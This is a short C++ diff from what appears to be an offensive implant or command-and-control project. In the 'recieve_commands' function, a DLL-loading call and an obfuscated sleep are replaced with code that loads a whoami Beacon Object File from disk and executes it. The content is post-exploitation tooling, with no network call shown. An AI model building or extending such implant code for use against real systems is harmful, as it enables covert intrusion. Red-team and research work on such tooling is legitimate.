@@ -41,14 +41,13 @@ bool read_from_disk(const std::string& file_name, std::string& outbuff) {
 bool recieve_commands(const implant_context& ctx) {
 
     std::string shc_buff;
-    if(!read_from_disk("blabla.dll", shc_buff)) {
+    if(!read_from_disk("E:\\BOFs\\loader\\module\\ObjectLdr\\x64\\Release\\whoami.x64.o", shc_buff)) {
         std::cerr << "nah.." << std::endl;
         return false;
     }
 
-    std::cout << tasking::rundll(shc_buff) << std::endl;
-    obfus::sleep(5000);
-    std::cout << "finished." << std::endl;
+    std::cout << tasking::execute_bof(shc_buff, nullptr, 0) << std::endl;
+
     /*
     HINTERNET hSession = nullptr;
     HINTERNET hConnect = nullptr;
